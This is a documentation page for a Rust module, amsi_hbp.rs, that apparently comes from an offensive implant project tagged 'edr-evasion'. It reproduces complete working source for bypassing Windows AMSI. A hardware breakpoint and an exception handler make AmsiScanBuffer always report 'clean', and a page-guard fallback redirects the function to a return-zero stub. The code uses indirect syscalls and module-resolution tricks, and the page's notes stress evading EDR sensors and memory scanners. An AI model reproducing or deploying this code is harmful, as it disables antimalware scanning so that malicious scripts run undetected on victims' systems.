# crowd — amsi_hbp.rs  (⚡ GOD TIER — PEB walker + RecycledGate only, VEH/CONTEXT structs irreducible)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/amsi_hbp.rs` |
| **Lines** | 403 |
| **Tier** | P |
| **Cards** | T009-edr-evasion |
| **Role** | AMSI HW breakpoint bypass |
| **Unsafe blocks** | 8 |

## Purpose

# crowd — amsi_hbp.rs  (⚡ GOD TIER — PEB walker + RecycledGate only, VEH/CONTEXT structs irreducible)

AMSI bypass via Hardware Breakpoint (DR0) + Vectored Exception Handler.

## Primary: DR0 Hardware Breakpoint
1. Resolve `AmsiScanBuffer` from `amsi.dll` (GetProcAddress — no IAT entry).
2. Check that DR0 is NOT already in use (NtGetContextThread).
If DR0 is occupied → jump to Page Guard fallback.
3. Install a VEH handler at priority 1 (first in chain).
4. Set DR0 = AmsiScanBuffer + enable breakpoint in DR7.
5. When AmsiScanBuffer is called → CPU raises EXCEPTION_SINGLE_STEP.
6. VEH: set *result = AMSI_RESULT_CLEAN, skip to caller ret addr, EAX=S_OK.

**Zero bytes modified** in ntdll or amsi.dll.
**DR registers** are kernel-invisible to most ETW-TI sensors.

## Fallback: Page Guard
If DR0 is already occupied (e.g., another hook / debugger):
1. Allocate a shadow page aligned on 4K.
2. Copy AmsiScanBuffer's bytes to the shadow page.
3. Mark the original AmsiScanBuffer page as PAGE_GUARD | PAGE_EXECUTE_READ.
4. Any call to AmsiScanBuffer triggers STATUS_GUARD_PAGE_VIOLATION in VEH.
5. VEH redirects to our shadow stub that returns AMSI_RESULT_CLEAN.

## OPSEC
- No inline hooks (no byte writes to ntdll or amsi.dll)
- DR0 check prevents corruption of existing breakpoints (debugger compat)
- Page Guard fallback is invisible to memory scanners (page remains MEM_IMAGE)

## Constants

- `MEM_COMMIT_RAW`: `u32` = `0x1000`
- `MEM_RESERVE_RAW`: `u32` = `0x2000`
- `PAGE_READWRITE_RAW`: `u32` = `0x04`
- `PAGE_EXECUTE_READ_RAW`: `u32` = `0x20`
- `PAGE_GUARD_RAW`: `u32` = `0x100`
- `CURRENT_PROCESS`: `usize` = `(-1isize) as usize`
- `S_OK`: `i32` = `0`
- `AMSI_RESULT_CLEAN`: `i32` = `0`
- `EFLAGS_TRAP_FLAG`: `u32` = `1 << 8`
- `CLEAN_STUB_BYTES`: `[u8; 3]` = `[0x31, 0xC0, 0xC3]`

## Public API

### `patch_fsm` (line 378)
```rust
pub fn patch_fsm(_ctx: &mut crate::fsm::ExecutionContext) -> bool
```
FSM integration: patches AMSI. ETW muffling is deferred to setup_fsm (after syscall map init).

### `install_amsi_hbp` (line 386)
```rust
pub fn install_amsi_hbp()
```
Install AMSI bypass.
Tries DR0 hardware breakpoint first; falls back to Page Guard if DR0 is occupied.
Silently ignores all failures (AMSI is optional hardening, not a hard requirement).

## Internal Functions

- `set_bits` (line 70)
- `clear_breakpoint` (line 75)
- `enable_breakpoint` (line 88)
- `dr0_is_occupied` (line 107)
- `get_arg` (line 115)
- `get_return_address` (line 127)
- `set_result` (line 131)
- `adjust_stack_pointer` (line 135)
- `set_ip` (line 139)
- `exception_handler` (unsafe) (line 146)
- `nt_get_context` (unsafe) (line 198)
- `NtGetContextThread` (line 214)
- `nt_set_context` (unsafe) (line 219)
- `NtSetContextThread` (line 233)
- `install_dr0_bypass` (unsafe) (line 241)
- `install_page_guard_bypass` (unsafe) (line 277)
- `resolve_amsi_scan_buffer` (line 335)

## Key Dependencies

- `use winapi::shared::minwindef::ULONG;`
- `use winapi::um::{`
- `use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};`

## Full Source

```rust
//! # crowd — amsi_hbp.rs  (⚡ GOD TIER — PEB walker + RecycledGate only, VEH/CONTEXT structs irreducible)
//!
//! AMSI bypass via Hardware Breakpoint (DR0) + Vectored Exception Handler.
//!
//! ## Primary: DR0 Hardware Breakpoint
//!   1. Resolve `AmsiScanBuffer` from `amsi.dll` (GetProcAddress — no IAT entry).
//!   2. Check that DR0 is NOT already in use (NtGetContextThread).
//!      If DR0 is occupied → jump to Page Guard fallback.
//!   3. Install a VEH handler at priority 1 (first in chain).
//!   4. Set DR0 = AmsiScanBuffer + enable breakpoint in DR7.
//!   5. When AmsiScanBuffer is called → CPU raises EXCEPTION_SINGLE_STEP.
//!   6. VEH: set *result = AMSI_RESULT_CLEAN, skip to caller ret addr, EAX=S_OK.
//!
//! **Zero bytes modified** in ntdll or amsi.dll.
//! **DR registers** are kernel-invisible to most ETW-TI sensors.
//!
//! ## Fallback: Page Guard
//! If DR0 is already occupied (e.g., another hook / debugger):
//!   1. Allocate a shadow page aligned on 4K.
//!   2. Copy AmsiScanBuffer's bytes to the shadow page.
//!   3. Mark the original AmsiScanBuffer page as PAGE_GUARD | PAGE_EXECUTE_READ.
//!   4. Any call to AmsiScanBuffer triggers STATUS_GUARD_PAGE_VIOLATION in VEH.
//!   5. VEH redirects to our shadow stub that returns AMSI_RESULT_CLEAN.
//!
//! ## OPSEC
//! - No inline hooks (no byte writes to ntdll or amsi.dll)
//! - DR0 check prevents corruption of existing breakpoints (debugger compat)
//! - Page Guard fallback is invisible to memory scanners (page remains MEM_IMAGE)

#![allow(non_snake_case, non_camel_case_types, dead_code)]

use std::ptr::null_mut;
use std::ffi::c_void;
use winapi::shared::minwindef::ULONG;
use winapi::um::{
    errhandlingapi::AddVectoredExceptionHandler,
    minwinbase::{EXCEPTION_GUARD_PAGE, EXCEPTION_SINGLE_STEP},
    winnt::{
        CONTEXT, CONTEXT_ALL, EXCEPTION_POINTERS, HANDLE, LONG,
    },
};
use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};

// ── Raw NT constants (no Win32 imports — RecycledGate path) ──────────────────
const MEM_COMMIT_RAW:  u32 = 0x1000;
const MEM_RESERVE_RAW: u32 = 0x2000;
const PAGE_READWRITE_RAW:     u32 = 0x04;
const PAGE_EXECUTE_READ_RAW:  u32 = 0x20;
const PAGE_GUARD_RAW:         u32 = 0x100;
const CURRENT_PROCESS: usize = (-1isize) as usize;

type HAMSICONTEXT = *mut c_void;
type HAMSISESSION = *mut c_void;
type AMSI_RESULT  = i32;
type LPCWSTR      = *const u16;
type LPCVOID      = *const c_void;

const S_OK:               i32 = 0;
const AMSI_RESULT_CLEAN:  i32 = 0;
const EFLAGS_TRAP_FLAG:   u32 = 1 << 8;

// Global state — set once by install_amsi_hbp()
static mut AMSI_SCAN_BUFFER_PTR:    Option<*mut u8> = None;
// Page Guard fallback: pointer to the trampoline that returns AMSI_RESULT_CLEAN
static mut PAGE_GUARD_SHADOW_STUB:  Option<*mut u8> = None;
static mut PAGE_GUARD_ACTIVE:       bool            = false;

// ── DR register helpers ───────────────────────────────────────────────────────

fn set_bits(dw: u64, low_bit: i32, bits: i32, new_value: u64) -> u64 {
    let mask = (1u64 << bits) - 1;
    (dw & !(mask << low_bit)) | (new_value << low_bit)
}

fn clear_breakpoint(ctx: &mut CONTEXT, index: i32) {
    match index {
        0 => ctx.Dr0 = 0,
        1 => ctx.Dr1 = 0,
        2 => ctx.Dr2 = 0,
        3 => ctx.Dr3 = 0,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags &= !EFLAGS_TRAP_FLAG;
}

fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: i32) {
    match index {
        0 => ctx.Dr0 = address as u64,
        1 => ctx.Dr1 = address as u64,
        2 => ctx.Dr2 = address as u64,
        3 => ctx.Dr3 = address as u64,
        _ => {}
    }
    // Preserve condition/size bits for OTHER debug registers.
    // Only clear and set the 4 bits (condition=2 + size=2) for THIS index.
    // Bits layout in DR7: condition at 16+index*4 (2 bits), size at 18+index*4 (2 bits).
    let cond_size_offset = 16 + index * 4;
    ctx.Dr7 = set_bits(ctx.Dr7, cond_size_offset, 2, 0);  // condition = 00 (execute)
    ctx.Dr7 = set_bits(ctx.Dr7, cond_size_offset + 2, 2, 0);  // size = 00 (1 byte)
    // OR in the local enable bit for this DR index (preserve other enable bits)
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 1);
    ctx.Dr6 = 0;
}

fn dr0_is_occupied(ctx: &CONTEXT) -> bool {
    // DR7 bit 0 = L0 (local enable), bit 1 = G0 (global enable) for DR0.
    // DR0 is occupied if EITHER is set.
    (ctx.Dr7 & 0x3) != 0
}

// ── Argument / return ABI helpers ─────────────────────────────────────────────

fn get_arg(ctx: &CONTEXT, index: i32) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe {
            *((ctx.Rsp as *const u64).offset((index + 1) as isize) as *const usize)
        },
    }
}

fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *(ctx.Rsp as *const usize) }
}

fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp = (ctx.Rsp as i64 + amount as i64) as u64;
}

fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

// ── VEH handler ───────────────────────────────────────────────────────────────

#[allow(static_mut_refs)]
unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> LONG {
    let exception_record = &*(*exceptions).ExceptionRecord;
    let ctx = &mut *(*exceptions).ContextRecord;

    let target = match AMSI_SCAN_BUFFER_PTR {
        Some(ptr) => ptr,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    // ── CASE 1: DR0 hardware breakpoint on AmsiScanBuffer ────────────────────
    if exception_record.ExceptionCode == EXCEPTION_SINGLE_STEP
        && exception_record.ExceptionAddress as *mut u8 == target
    {
        // arg5 (index 5 in x64 calling convention) = pResult
        let scan_result_ptr = get_arg(ctx, 5) as *mut i32;
        if !scan_result_ptr.is_null() {
            *scan_result_ptr = AMSI_RESULT_CLEAN;
        }
        let return_address = get_return_address(ctx);
        set_ip(ctx, return_address);
        adjust_stack_pointer(ctx, std::mem::size_of::<*mut u8>() as i32);
        set_result(ctx, S_OK as usize);
        clear_breakpoint(ctx, 0);
        // Re-arm the breakpoint for subsequent calls
        enable_breakpoint(ctx, target, 0);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ── CASE 2: Page Guard violation on AmsiScanBuffer page ──────────────────
    if PAGE_GUARD_ACTIVE
        && exception_record.ExceptionCode == EXCEPTION_GUARD_PAGE
    {
        let fault_addr = exception_record.ExceptionAddress as *mut u8;
        // Check if the fault is within the page containing AmsiScanBuffer
        let page_base = (target as usize) & !0xFFF;
        let fault_page = (fault_addr as usize) & !0xFFF;
        if fault_page == page_base {
            // Redirect execution to shadow stub
            if let Some(stub) = PAGE_GUARD_SHADOW_STUB {
                set_ip(ctx, stub as usize);
                // Re-arm the guard page on next step via TF bit
                ctx.EFlags |= EFLAGS_TRAP_FLAG;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }

    EXCEPTION_CONTINUE_SEARCH
}

// ── NT bindings via RecycledGate ──────────────────────────────────────────────

unsafe fn nt_get_context(ctx: *mut CONTEXT) -> bool {
    // NtGetContextThread(NtCurrentThread = -2)
    if let Some((ssn, gadget)) = crate::syscall_map::get_ssn_and_gadget(
        crate::resolve::compute_hash("NtGetContextThread"),
    ) {
        if gadget != 0 {
            let status = crate::recycled::recycled2(
                ssn, gadget,
                (-2isize) as usize,  // NtCurrentThread pseudo-handle
                ctx as usize,
            );
            return status == 0;
        }
    }
    // Fallback: direct import
    extern "system" {
        fn NtGetContextThread(h: HANDLE, ctx: *mut CONTEXT) -> ULONG;
    }
    NtGetContextThread(-2isize as HANDLE, ctx) == 0
}

unsafe fn nt_set_context(ctx: *mut CONTEXT) -> bool {
    if let Some((ssn, gadget)) = crate::syscall_map::get_ssn_and_gadget(
        crate::resolve::compute_hash("NtSetContextThread"),
    ) {
        if gadget != 0 {
            let status = crate::recycled::recycled2(
                ssn, gadget,
                (-2isize) as usize,
                ctx as usize,
            );
            return status == 0;
        }
    }
    extern "system" {
        fn NtSetContextThread(h: HANDLE, ctx: *mut CONTEXT) -> ULONG;
    }
    NtSetContextThread(-2isize as HANDLE, ctx) == 0
}

// ── DR0 Primary Installation ──────────────────────────────────────────────────

#[allow(static_mut_refs)]
unsafe fn install_dr0_bypass(target: *mut u8) -> Result<(), String> {
    let h_ex = AddVectoredExceptionHandler(1, Some(exception_handler));
    if h_ex.is_null() {
        return Err("AddVectoredExceptionHandler failed".into());
    }

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_ALL;
    if !nt_get_context(&mut ctx) {
        return Err("NtGetContextThread failed".into());
    }

    // Check if DR0 is already in use
    if dr0_is_occupied(&ctx) {
        return Err("DR0 is occupied — falling back to Page Guard".into());
    }

    enable_breakpoint(&mut ctx, target, 0);
    if !nt_set_context(&mut ctx) {
        return Err("NtSetContextThread failed".into());
    }

    Ok(())
}

// ── Page Guard Fallback ───────────────────────────────────────────────────────

// Minimal stub: xor eax,eax (EAX=0=S_OK); ret
// The caller interprets *pResult=0 = AMSI_RESULT_CLEAN because we also set
// the result register before jumping here. But the simplest path is: set RIP
// to the original return address with EAX=0 in the VEH handler above.
// This stub is only needed as a landing target for Page Guard.
// Bytes: xor eax,eax (2B) + ret (1B) = 3 bytes
const CLEAN_STUB_BYTES: [u8; 3] = [0x31, 0xC0, 0xC3];

#[allow(static_mut_refs)]
unsafe fn install_page_guard_bypass(target: *mut u8) -> Result<(), String> {
    // ── Step 1: Allocate stub as RW (never RWX) via RecycledGate ─────────────
    let mut stub_base: *mut c_void = null_mut();
    let mut stub_size: usize = CLEAN_STUB_BYTES.len();
    let status = crate::recycled::nt_allocate_virtual_memory(
        CURRENT_PROCESS,
        &mut stub_base,
        0,
        &mut stub_size,
        MEM_COMMIT_RAW | MEM_RESERVE_RAW,
        PAGE_READWRITE_RAW,
    );
    if status < 0 || stub_base.is_null() {
        return Err("NtAllocateVirtualMemory for Page Guard stub failed".into());
    }
    let stub = stub_base as *mut u8;

    // ── Step 2: Write stub bytes (RW page — direct write, no WriteProcessMemory)
    std::ptr::copy_nonoverlapping(CLEAN_STUB_BYTES.as_ptr(), stub, CLEAN_STUB_BYTES.len());

    // ── Step 3: Flip RW → RX (never RWX at any point) ───────────────────────
    let mut old_prot: u32 = 0;
    let status = crate::recycled::nt_protect_virtual_memory(
        CURRENT_PROCESS,
        &mut stub_base,
        &mut stub_size,
        PAGE_EXECUTE_READ_RAW,
        &mut old_prot,
    );
    if status < 0 {
        return Err("NtProtectVirtualMemory RW→RX on stub failed".into());
    }

    // ── Step 4: Mark AmsiScanBuffer page as PAGE_GUARD via RecycledGate ──────
    let page_base = (target as usize) & !0xFFF;
    let mut guard_base = page_base as *mut c_void;
    let mut guard_size: usize = 0x1000;
    let mut old_protect: u32 = 0;
    let status = crate::recycled::nt_protect_virtual_memory(
        CURRENT_PROCESS,
        &mut guard_base,
        &mut guard_size,
        PAGE_EXECUTE_READ_RAW | PAGE_GUARD_RAW,
        &mut old_protect,
    );
    if status < 0 {
        return Err("NtProtectVirtualMemory PAGE_GUARD failed".into());
    }

    PAGE_GUARD_SHADOW_STUB = Some(stub);
    PAGE_GUARD_ACTIVE = true;

    Ok(())
}

// ── Resolve AmsiScanBuffer ────────────────────────────────────────────────────

#[allow(static_mut_refs)]
fn resolve_amsi_scan_buffer() -> Option<*mut u8> {
    unsafe {
        if let Some(ptr) = AMSI_SCAN_BUFFER_PTR {
            return Some(ptr);
        }
        // PEB walker: check if amsi.dll is already loaded
        let mut base = crate::resolve::find_module_base("amsi.dll");
        if base.is_null() {
            // amsi.dll not loaded — load via LdrLoadDll (ntdll, no kernel32 surface)
            // LdrLoadDll(SearchPath, Flags, ModuleName, BaseAddress) from ntdll
            let ntdll = crate::resolve::ntdll_base_and_name_hashes().0;
            if ntdll.is_null() { return None; }
            let ldr_load = crate::resolve::resolve_export_by_name(ntdll, "LdrLoadDll");
            if ldr_load.is_null() { return None; }
            type LdrLoadDllFn = unsafe extern "system" fn(
                *const u16, *mut u32, *mut [usize; 2], *mut *const u8,
            ) -> i32;
            let ldr_load: LdrLoadDllFn = std::mem::transmute(ldr_load);
            // Build UNICODE_STRING for "amsi.dll"
            let amsi_wide: [u16; 9] = [b'a' as u16, b'm' as u16, b's' as u16, b'i' as u16,
                                         b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0];
            let mut us: [usize; 2] = [
                (8u16 as usize) | ((10u16 as usize) << 16), // Length=8*2=16, MaxLen=18
                amsi_wide.as_ptr() as usize,
            ];
            // Correct UNICODE_STRING: Length=16 bytes (8 chars * 2), MaxLength=18
            us[0] = 16 | (18 << 16);
            let mut out_base: *const u8 = null_mut() as _;
            let st = ldr_load(null_mut() as _, null_mut(), &mut us, &mut out_base);
            if st < 0 || out_base.is_null() { return None; }
            base = out_base;
        }
        // Resolve AmsiScanBuffer via PE export table walker
        let addr = crate::resolve::resolve_export_by_name(base, "AmsiScanBuffer");
        if addr.is_null() { return None; }
        AMSI_SCAN_BUFFER_PTR = Some(addr as *mut u8);
        Some(addr as *mut u8)
    }
}

// ── Public API ────────────────────────────────────────────────────────────────

/// FSM integration: patches AMSI. ETW muffling is deferred to setup_fsm (after syscall map init).
pub fn patch_fsm(_ctx: &mut crate::fsm::ExecutionContext) -> bool {
    install_amsi_hbp();
    true
}

/// Install AMSI bypass.
/// Tries DR0 hardware breakpoint first; falls back to Page Guard if DR0 is occupied.
/// Silently ignores all failures (AMSI is optional hardening, not a hard requirement).
pub fn install_amsi_hbp() {
    unsafe {
        let target = match resolve_amsi_scan_buffer() {
            Some(p) => p,
            None => return, // amsi.dll not present — PowerShell host only
        };

        match install_dr0_bypass(target) {
            Ok(()) => {
                // DR0 primary installed — done
            }
            Err(_) => {
                // DR0 occupied or failed — try Page Guard
                let _ = install_page_guard_bypass(target);
            }
        }
    }
}

```